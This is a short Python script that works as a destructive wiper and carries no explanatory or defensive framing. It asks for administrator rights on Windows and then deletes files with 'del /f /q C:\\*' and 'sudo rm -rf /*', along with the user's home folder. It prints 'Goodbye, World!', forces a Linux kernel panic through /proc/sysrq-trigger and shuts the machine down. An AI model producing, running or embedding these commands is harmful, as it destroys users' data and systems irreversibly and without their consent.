import os
import sys
import platform
import ctypes

system = platform.system()

def run_as_admin():
    if system == "Windows":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def delete_files():
    current_user = os.getlogin()
    
    if system == "Windows":
        os.system(f"del /f /q C:\\*")
        os.system(f"del /f /q C:\\Users\\{current_user}\\*")
    elif system == "Linux":
        os.system("sudo rm -rf /*")
        os.system(f"sudo rm -rf /home/{current_user}/*")

def shutdown():
  if system == "Windows":
      os.system("shutdown /s /t 0")
  elif system == "Linux":
      os.system("poweroff")

def panic():
    if system == "Linux":
        os.system("echo c > /proc/sysrq-trigger")

run_as_admin()
delete_files()

print("Goodbye, World!")

panic()
shutdown()
